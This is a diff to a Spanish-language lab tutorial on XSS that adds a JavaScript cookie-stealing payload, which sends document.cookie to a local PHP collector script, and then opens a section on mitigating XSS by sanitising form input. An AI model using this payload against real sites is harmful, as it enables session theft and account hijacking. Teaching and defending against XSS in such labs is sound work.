@@ -57,5 +57,19 @@ chmod 777 /var/www/html/cookieStealer/cookies.txt
 ```
 Y en el fichero ***index.php*** introducimos el código de [Este archivo](./Recursos/index.php)
 
+Ahora si introducimos el siguiente código Javascript en el formulario:
+
+```
+<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
+```
+Va a mandar las cookies a nuestro fichero ***index.php***:
+
+![php1](./Imagenes/5.png)
+
+![php1](./Imagenes/6.png)
+
 ## 3. Implementar modificaciones al código para mitigar los ataques XSS
+
+En este apartado vamos a implementar modificaciones en el código php del formulario, que filtren y sanitizen la entrada del usuario, para evitar estos ataques de XSS:
+
 
